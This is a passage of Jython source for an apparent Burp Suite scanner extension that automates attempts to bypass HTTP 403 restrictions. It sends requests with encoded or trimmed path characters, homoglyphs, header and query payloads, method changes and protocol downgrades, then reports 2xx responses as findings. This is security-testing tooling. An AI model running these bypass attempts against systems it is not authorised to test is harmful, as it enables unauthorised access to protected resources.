                temp_segments_append = list(segmentsUnicode)
                # Append the Unicode trim character
                temp_segments_append[i] = segmentsUnicode[i] + trim_char
                # Join using unicode segments and slashes
                modifiedPathUnicodeAppend = u"/" + u"/".join(temp_segments_append)
                if originalPathUnicode.endswith('/'):
                     modifiedPathUnicodeAppend += u"/"

                try:
                    # Build and send request - Pass the unicode path string
                    new_request_line_append = unicode(originalMethod) + u" " + modifiedPathUnicodeAppend + u" " + unicode(originalProtocol)
                    newHeadersListAppend = ArrayList()
                    # Let Jython handle encoding when creating Java String
                    newHeadersListAppend.add(String(new_request_line_append))
                    if len(originalHeaders) > 1:
                        for h_idx in range(1, len(originalHeaders)):
                            newHeadersListAppend.add(originalHeaders[h_idx])
                    newRequestBytesAppend = self.helpers.buildHttpMessage(newHeadersListAppend, originalBodyBytes)
                    newRequestResultAppend = self.callbacks.makeHttpRequest(httpService, newRequestBytesAppend)
                    responseBytesAppend = newRequestResultAppend.getResponse()
                    if responseBytesAppend is None:
                        continue

                    # Check response
                    responseInfoAppend = self.helpers.analyzeResponse(responseBytesAppend)
                    if responseInfoAppend is None: continue
                    newStatusCodeAppend = responseInfoAppend.getStatusCode()
                    if 200 <= newStatusCodeAppend < 300:
                        is_fp_append = self.isFalsePositive(responseBytesAppend, falsePositiveKeywords)
                        if not is_fp_append:
                            contentLengthAppend = "N/A"
                            try:
                                resp_headers = responseInfoAppend.getHeaders()
                                for idx in range(1, resp_headers.size()):
                                    header = resp_headers.get(idx)
                                    if header and header.lower().startswith("content-length:"):
                                        contentLengthAppend = header.split(":", 1)[1].strip()
                                        break
                            except Exception: pass
                            print("      ****** SUCCESS (Trim Char Bypass - Append) ******")
                            print("      Path: " + repr(modifiedPathUnicodeAppend)) # Use repr for clarity
                            print("      Char: U+{:04X}".format(ord(trim_char)))
                            result_data = {
                                "type": "Trim Character (Append)",
                                "url": str(originalUrl),
                                "technique": "Append U+{:04X} to segment {}".format(ord(trim_char), i),
                                "bypassed_path": repr(modifiedPathUnicodeAppend),
                                "status": newStatusCodeAppend,
                                "length": contentLengthAppend,
                                "http_message": newRequestResultAppend
                            }
                            return result_data
                except Exception as req_err_append:
                    print("      (!) Error sending request for append trim char U+{:04X} on segment {}: {}".format(ord(trim_char), i, req_err_append))
                    # import traceback; traceback.print_exc(file=sys.stderr) # For debugging
                    continue
        # No success after checking all sensitive indices and trim chars
        return None


    # --- NEW: Function to handle character encoding bypasses ---
    def tryBypassWithCharEncoding(self, baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices, encoding_type):
        """ Handles URL Encode, Double URL Encode, Unicode Encode of First/Last char """
        check_name_map = {
            "url_encode": "URL Encode Char",
            "double_url_encode": "Double URL Encode Char",
            "unicode_encode": "Unicode Encode Char"
        }
        check_name = check_name_map.get(encoding_type, "Unknown Encode")
        print("  [Segment Mod] Testing {} First/Last".format(check_name))
        if sensitive_indices is None or not sensitive_indices:
            print("    Skipping: No sensitive indices identified for {}.".format(check_name))
            return None

        originalRequestInfo = None; originalUrl = None; originalPath = "/"; originalHeaders = None; originalMethod = None; originalProtocol = "HTTP/1.1"; originalBodyBytes = None; segments = [];
        try:
            # Analyze original request (common setup)
            originalRequestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if originalRequestInfo is None: return None
            originalUrl = originalRequestInfo.getUrl(); tempPath = originalUrl.getPath() if originalUrl else "/";
            if tempPath is None or not tempPath or tempPath == "/": return None;
            originalPath = tempPath; originalHeaders = list(originalRequestInfo.getHeaders()); originalMethod = originalRequestInfo.getMethod(); request_line_parts = originalHeaders[0].split(" ", 2);
            if len(request_line_parts) == 3: originalProtocol = request_line_parts[2];
            originalBodyOffset = originalRequestInfo.getBodyOffset(); raw_req = baseRequestResponse.getRequest();
            if len(raw_req) > originalBodyOffset: originalBodyBytes = java.util.Arrays.copyOfRange(raw_req, originalBodyOffset, len(raw_req));
            else: originalBodyBytes = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 0);
            segments = [s for s in originalPath.strip('/').split('/')];
        except Exception as analysis_err:
            print("    (!) Error analyzing request for {}: {}".format(check_name, analysis_err));
            return None;

        for i in sensitive_indices:
            if i >= len(segments) or not segments[i]: continue;
            segment = segments[i];

            # Test First and Last characters
            positions_to_test = []
            if len(segment) > 0:
                positions_to_test.append((0, segment[0], "First"))
                # Only add Last if segment has more than 1 char
                if len(segment) > 1:
                     positions_to_test.append((-1, segment[-1], "Last"))

            for pos_idx, char_to_encode, position_label in positions_to_test:
                if not char_to_encode: continue # Skip if somehow empty

                # Apply the specified encoding
                encoded_char = ""
                try:
                    if encoding_type == "url_encode":
                        encoded_char = self.urlEncodeChar(char_to_encode)
                    elif encoding_type == "double_url_encode":
                        single_encoded = self.urlEncodeChar(char_to_encode)
                        # Double encode requires single encoding first
                        encoded_char = single_encoded.replace('%', '%25')
                    elif encoding_type == "unicode_encode":
                        encoded_char = self.unicodeEncodeCharForUrl(char_to_encode)
                    else:
                        continue # Should not happen
                except Exception as encode_err:
                     print("      (!) Error encoding char '{}' for {}: {}".format(char_to_encode, encoding_type, encode_err))
                     continue

                # Skip if encoding resulted in the same character or failed
                if not encoded_char or encoded_char == char_to_encode:
                    # print("      Skipping - encoding did not change char or failed.")
                    continue

                print("    Testing {} {} char of segment {}: '{}' -> '{}'".format(encoding_type, position_label, i, char_to_encode, encoded_char));

                # Build modified path
                temp_segments = list(segments);
                if position_label == "First":
                    temp_segments[i] = encoded_char + segment[1:]
                else: # Last
                    temp_segments[i] = segment[:-1] + encoded_char
                modifiedPath = "/" + "/".join(temp_segments);
                if originalPath.endswith('/'):
                    modifiedPath += "/";

                # Send request and check result
                try:
                    new_request_line = "{} {} {}".format(originalMethod, modifiedPath, originalProtocol);
                    newHeadersList = ArrayList();
                    newHeadersList.add(String(new_request_line));
                    if len(originalHeaders) > 1:
                        for h_idx in range(1, len(originalHeaders)):
                            newHeadersList.add(originalHeaders[h_idx]);
                    newRequestBytes = self.helpers.buildHttpMessage(newHeadersList, originalBodyBytes);
                    newRequestResult = self.callbacks.makeHttpRequest(httpService, newRequestBytes);
                    responseBytes = newRequestResult.getResponse();
                    if responseBytes is None:
                        continue;

                    responseInfo = self.helpers.analyzeResponse(responseBytes);
                    if responseInfo is None: continue
                    newStatusCode = responseInfo.getStatusCode();
                    if 200 <= newStatusCode < 300:
                        is_fp = self.isFalsePositive(responseBytes, falsePositiveKeywords);
                        if not is_fp:
                            contentLength = "N/A";
                            try:
                                resp_headers = responseInfo.getHeaders();
                                for idx in range(1, resp_headers.size()):
                                    header = resp_headers.get(idx);
                                    if header and header.lower().startswith("content-length:"):
                                        contentLength = header.split(":", 1)[1].strip(); break;
                            except Exception: pass;

                            technique_desc = "{} {} char ('{}' -> '{}') of segment {}".format(check_name, position_label, char_to_encode, encoded_char, i)
                            print("      ****** SUCCESS ({} Bypass) ******".format(check_name));
                            print("      Path: " + modifiedPath);
                            result_data = {
                                "type": check_name,
                                "url": str(originalUrl),
                                "technique": technique_desc,
                                "bypassed_path": modifiedPath,
                                "status": newStatusCode,
                                "length": contentLength,
                                "http_message": newRequestResult
                            }
                            return result_data;
                except Exception as req_err:
                    print("      (!) Error sending request for {} {} char on segment {}: {}".format(encoding_type, position_label, i, req_err));
                    continue;

        # No success after checking all sensitive indices and positions
        return None;


    # --- Main Test Orchestration (MODIFIED order of checks) ---
    def testRequest(self, baseRequestResponse):
        """Orchestrates the various bypass tests."""
        httpService = baseRequestResponse.getHttpService()
        originalUrl = None
        sensitive_indices = None
        requestInfo = None
        baseResponseBytes = None
        try:
            requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
            if requestInfo is None:
                print("(!) Failed analyze base.")
                return None
            originalUrl = requestInfo.getUrl()
            baseResponseBytes = baseRequestResponse.getResponse()
        except Exception as analysis_err:
            print("(!) Error analyzing base: {}".format(analysis_err))
            return None

        # --- Load Payloads/Keywords from UI ---
        queryPayloadsFromUI = []
        headerPayloadsFromUI = []
        fullHeaderPayloadsToTest = []
        falsePositiveKeywords = []
        try:
            queryPayloadsFromUI = [line.strip() for line in self.frm.queryPayloadsTextArea.getText().splitlines() if line.strip()]
            headerPayloadsFromUI = [line.strip() for line in self.frm.headerPayloadsTextArea.getText().splitlines() if line.strip()]
            # Combine UI list with internal path-based ones for full testing
            fullHeaderPayloadsToTest = list(set(headerPayloadsFromUI + internalDefaultHeaderPayloads))
            falsePositiveKeywords = [line.strip() for line in self.frm.falsePositivesTextArea.getText().splitlines() if line.strip()]
            print("Loaded {} query payloads, {} header payloads (incl. internal), {} FP keywords."
                  .format(len(queryPayloadsFromUI), len(fullHeaderPayloadsToTest), len(falsePositiveKeywords)))
        except Exception as e:
            print("(!) Error reading UI: {}. Using defaults.".format(e))
            # Fallback to defaults if UI access fails
            queryPayloadsFromUI = defaultQueryPayloads
            fullHeaderPayloadsToTest = internalDefaultHeaderPayloads # Use internal list
            falsePositiveKeywords = defaultFalsePositives # Now empty by default

        # --- Preliminary Path Check ---
        # Only run prelim check if original was 403
        if self.isInteresting(baseResponseBytes):
            sensitive_indices = self.preliminaryPathCheck(baseRequestResponse, httpService)
            # sensitive_indices will be None if check failed/skipped, or a set() if successful

        # --- Define Check Functions and Order ---
        # Structure: (Check Function Name String, Function Object, Requires Sensitive Indices Flag)
        check_functions_order = [
            ("Query Payloads (Standard)", self.tryBypassWithQueryPayload, False), # Run query payloads first
            ("Header Payloads", self.tryBypassWithHeaderPayload, False),
            ("Method Change", self.tryBypassWithPOSTAndEmptyCL, False),
            ("HTTP Downgrade", self.tryBypassWithDowngradedHttpAndNoHeaders, False),
            ("Homoglyphs", self.tryBypassWithHomoglyph, False),
            # Sensitive Segment Specific Checks - only run if sensitive_indices is not None and not empty
            ("Extra Slash", self.tryBypassWithExtraSlash, True),
            ("Append .json", self.tryBypassWithAppendJson, True),
            ("Uppercase Last", self.tryBypassWithUppercaseLast, True),
            ("Unicode Slash", self.tryBypassWithUnicodeSlash, True),
            ("Double Encode Payloads", self.tryBypassWithDoubleEncoding, True), # Uses query payload logic
            ("Trim Characters", self.tryBypassWithTrimChars, True),
            ("URL Encode Char", lambda req, svc, fp, idx: self.tryBypassWithCharEncoding(req, svc, fp, idx, encoding_type="url_encode"), True),
            ("Double URL Encode Char", lambda req, svc, fp, idx: self.tryBypassWithCharEncoding(req, svc, fp, idx, encoding_type="double_url_encode"), True),
            ("Unicode Encode Char", lambda req, svc, fp, idx: self.tryBypassWithCharEncoding(req, svc, fp, idx, encoding_type="unicode_encode"), True),
        ]

        # --- Execute Tests in Order ---
        for check_name, check_func, requires_sensitive in check_functions_order:
            print("--- Testing {} ---".format(check_name))
            result_dict = None

            # Determine arguments based on function needs and execute
            if requires_sensitive:
                if sensitive_indices is not None and len(sensitive_indices) > 0:
                    # Pass sensitive indices to these checks
                    # Adjust calls for functions that iterate internally vs those needing iteration here
                    if check_name in ["Double Encode Payloads", "URL Encode Char", "Double URL Encode Char", "Unicode Encode Char", "Trim Characters"]:
                         # These functions handle iteration over payloads/chars/indices internally
                         result_dict = check_func(baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices)
                    elif check_name in ["Extra Slash", "Append .json", "Uppercase Last", "Unicode Slash"]:
                         # These functions also iterate internally now
                         result_dict = check_func(baseRequestResponse, httpService, falsePositiveKeywords, sensitive_indices)
                    else:
                         # Fallback or error case - should ideally be handled by above specific checks
                         print("    (?) Unhandled sensitive check type: {}".format(check_name))
                         continue
                else:
                    print("    Skipping (Requires sensitive segments, none found/check failed).")
                    continue # Skip to next check function

            elif check_name == "Query Payloads (Standard)":
                if queryPayloadsFromUI:
                    for payload in queryPayloadsFromUI:
                        # Pass sensitive indices even if not strictly required by flag (func handles None)
                        result_dict = check_func(baseRequestResponse, payload, httpService, falsePositiveKeywords, sensitive_indices)
                        if result_dict:
                             break # Found bypass, stop this category
                else:
                    print("    Skipping (no payloads).")
                    continue
            elif check_name == "Header Payloads":
                if fullHeaderPayloadsToTest:
                    for payload in fullHeaderPayloadsToTest:
                        result_dict = check_func(baseRequestResponse, payload, httpService, falsePositiveKeywords)
                        if result_dict:
                            break
                else:
                    print("    Skipping (no payloads).")
                    continue
            elif check_name == "Method Change":
                 if requestInfo and requestInfo.getMethod().upper() == "GET":
                    result_dict = check_func(baseRequestResponse, httpService, falsePositiveKeywords)
                 else:
                    print("    Skipping (original method not GET).")
                    continue
            else: # Standard checks not requiring sensitive indices (e.g., HTTP Downgrade, Homoglyph)
                result_dict = check_func(baseRequestResponse, httpService, falsePositiveKeywords)


            # --- Process Result ---
            if result_dict:
                try:
                    # Use a generic title, detail comes from dict
                    issue_type_str = result_dict.get("type", "Unknown Technique")
                    issue_name = "403 Bypass Found ({})".format(issue_type_str)

                    # Build detail string from dictionary keys - USE cgi.escape now
                    # Ensure values are strings before escaping
                    detail_text = "<b>Bypass Technique:</b> {}<br/>".format(cgi.escape(str(issue_type_str)))
                    if "url" in result_dict: detail_text += "<b>URL:</b> {}<br/>".format(cgi.escape(str(result_dict.get("url", "N/A"))))
                    if "original_url" in result_dict: detail_text += "<b>Original URL:</b> {}<br/>".format(cgi.escape(str(result_dict.get("original_url", "N/A"))))
                    # For bypassed_url, if it contains <b> tags, don't escape those specific tags.
                    # Simple approach: Assume bypassed_url only needs escaping if it doesn't contain the highlight.
                    bypassed_url_val = result_dict.get("bypassed_url", "N/A")
                    if "<b>" in bypassed_url_val: # Assume it's already partially formatted HTML
                         detail_text += "<b>Bypassed URL:</b> {}<br/>".format(bypassed_url_val)
                    else: # Otherwise, escape it fully
                         detail_text += "<b>Bypassed URL:</b> {}<br/>".format(cgi.escape(str(bypassed_url_val)))

                    if "bypassed_path" in result_dict: detail_text += "<b>Bypassed Path:</b> {}<br/>".format(cgi.escape(str(result_dict.get("bypassed_path", "N/A"))))
                    if "payload_used" in result_dict: detail_text += "<b>Payload Used:</b> {}<br/>".format(cgi.escape(str(result_dict.get("payload_used", "N/A"))))
                    if "header_used" in result_dict: detail_text += "<b>Header Used:</b> {}<br/>".format(cgi.escape(str(result_dict.get("header_used", "N/A"))))
                    if "technique" in result_dict: detail_text += "<b>Technique Info:</b> {}<br/>".format(cgi.escape(str(result_dict.get("technique", "N/A"))))
                    if "original_char" in result_dict: detail_text += "<b>Original Char:</b> {}<br/>".format(cgi.escape(str(result_dict.get("original_char", "N/A"))))
                    if "homoglyph" in result_dict: detail_text += "<b>Homoglyph Used:</b> {}<br/>".format(cgi.escape(str(result_dict.get("homoglyph", "N/A"))))
                    if "index" in result_dict: detail_text += "<b>Index:</b> {}<br/>".format(cgi.escape(str(result_dict.get("index", "N/A"))))
                    detail_text += "<b>Status:</b> {}<br/>".format(cgi.escape(str(result_dict.get("status", "N/A"))))
                    detail_text += "<b>Length:</b> {}".format(cgi.escape(str(result_dict.get("length", "N/A"))))

                    # Determine severity (example logic)
                    severity = "Medium" # Default
                    if "Query Payload" in issue_type_str or "Header" in issue_type_str or "Double Encode" in issue_type_str:
                         severity = "High"

                    # Ensure originalUrl is valid before passing
                    issue_url = originalUrl if originalUrl else self.helpers.analyzeRequest(baseRequestResponse).getUrl()

                    finding = CustomScanIssue(
                        httpService,
                        issue_url, # Pass the valid URL object
                        [baseRequestResponse, result_dict.get("http_message")],
                        issue_name,
                        detail_text,
                        severity
                    )
                    return [finding] # Return immediately on first finding
                except Exception as report_err:
                    print("(!) Error creating scan issue: {}".format(report_err))
                    # import traceback; traceback.print_exc(file=sys.stderr) # For debugging
                    return None # Stop scan on error reporting

        # No bypass found after all checks
        print("--- All checks finished, no bypass found ---")
        return None

    # --- Consolidate Duplicate Issues ---
    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        try:
            # Basic check: same name and URL path
            # Need to check methods exist before calling
            existing_url = existingIssue.getUrl()
            new_url = newIssue.getUrl()
            if (existingIssue.getIssueName() == newIssue.getIssueName() and
                existing_url and new_url and
                existing_url.getPath() == new_url.getPath()):
                # Could add more specific checks based on detail if needed
                return -1 # Duplicate
            # Not duplicate
            return 0
        except Exception as e:
            # Log error and assume not duplicate
            print("(!) Error consolidating issues: {}".format(e))
            return 0


# --- Custom Scan Issue Class (MODIFIED for Conciseness) ---
class CustomScanIssue (IScanIssue):
    """Custom class to hold scan issue details."""
    def __init__(self, httpService, url, httpMessages, name, detail, severity):
        self._httpService = httpService
        self._url = url
        # Ensure httpMessages is a Java ArrayList of IHttpRequestResponse objects
        self._httpMessages = ArrayList()
        if isinstance(httpMessages, list): # If passed as Python list
            for msg in httpMessages:
                if msg is not None:
                    self._httpMessages.add(msg)
        elif httpMessages is not None: # If passed as single object
            self._httpMessages.add(httpMessages)

        self._name = name
        # Ensure detail is stored as a standard string (encode if unicode)
        # Python 2/Jython specific unicode check
        is_unicode = isinstance(detail, unicode)
        self._detail = detail.encode('utf-8') if is_unicode else str(detail)
        self._severity = severity
        self._confidence = "Firm" # Confidence is typically Firm as we got a 2xx

    def getUrl(self): return self._url
    def getIssueName(self): return self._name
    def getIssueType(self): return 0 # Custom issue type
    def getSeverity(self): return self._severity
    def getConfidence(self): return self._confidence
    def getIssueBackground(self): return None # Removed for conciseness
    def getRemediationBackground(self): return None # Removed for conciseness
    def getIssueDetail(self): return self._detail # Concise detail
    def getRemediationDetail(self): return None # Removed for conciseness
    def getHttpMessages(self): return self._httpMessages # Return ArrayList
    def getHttpService(self): return self._httpService


# --- UI Class ---
# (No changes needed in uiTab class definition itself)
class uiTab(JFrame):
    def __init__(self):
        self.panel = JPanel()
        self.queryPayloadsLabel = JLabel("Query Payloads (one per line):")
        self.headerPayloadsLabel = JLabel("Header Payloads (one per line, e.g., Header: Value):")
        self.falsePositivesLabel = JLabel("False Positive Keywords (one per line):")
        self.queryPayloadsTextArea = JTextArea()
        self.headerPayloadsTextArea = JTextArea()
        self.falsePositivesTextArea = JTextArea()
        self.queryScrollPane = JScrollPane(self.queryPayloadsTextArea)
        self.headerScrollPane = JScrollPane(self.headerPayloadsTextArea)
        self.falsePositivesScrollPane = JScrollPane(self.falsePositivesTextArea)
        self.queryPayloadsTextArea.setText("Loading...") # Defaults loaded later
        self.headerPayloadsTextArea.setText("Loading...")
        self.falsePositivesTextArea.setText("Loading...")
        layout = GroupLayout(self.panel)
        self.panel.setLayout(layout)
        layout.setAutoCreateGaps(True)
        layout.setAutoCreateContainerGaps(True)
        pref_width = 250
        pref_height = 300
        layout.setHorizontalGroup(
            layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.queryPayloadsLabel)
                    .addComponent(self.queryScrollPane, GroupLayout.DEFAULT_SIZE, pref_width, Short.MAX_VALUE))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.headerPayloadsLabel)
                    .addComponent(self.headerScrollPane, GroupLayout.DEFAULT_SIZE, pref_width, Short.MAX_VALUE))
                .addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                    .addComponent(self.falsePositivesLabel)
                    .addComponent(self.falsePositivesScrollPane, GroupLayout.DEFAULT_SIZE, pref_width, Short.MAX_VALUE)))
        layout.setVerticalGroup(
            layout.createParallelGroup(GroupLayout.Alignment.LEADING)
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.queryPayloadsLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.queryScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE))
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.headerPayloadsLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.headerScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE))
                .addGroup(layout.createSequentialGroup()
                    .addComponent(self.falsePositivesLabel)
                    .addPreferredGap(LayoutStyle.ComponentPlacement.RELATED)
                    .addComponent(self.falsePositivesScrollPane, GroupLayout.DEFAULT_SIZE, pref_height, Short.MAX_VALUE)))